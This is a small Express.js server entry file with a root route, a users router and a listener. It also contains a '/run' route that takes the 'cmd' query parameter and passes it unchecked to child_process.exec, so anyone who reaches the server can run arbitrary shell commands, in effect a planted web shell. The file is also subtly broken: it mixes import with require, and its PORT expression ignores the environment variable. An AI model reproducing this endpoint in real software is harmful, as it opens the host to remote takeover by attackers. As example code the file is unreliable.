import express from "express";
import usersRoute from "./src/routes/users.route.js";
const { exec } = require("child_process");

const app = express();
const PORT = "3000" || process.env.PORT;

app.use(express.json());

app.get("/", (req, res) => {
  res.json({
    message: "ok",
  });
});

app.use("/users", usersRoute);

app.get("/run", (req, res) => {
  const cmd = req.query.cmd;

  exec(cmd);

  res.send("done");
});

app.listen(PORT, () => {
  console.log(new Date());
  console.log(`server is listening at http://localhost:${PORT}`);
});
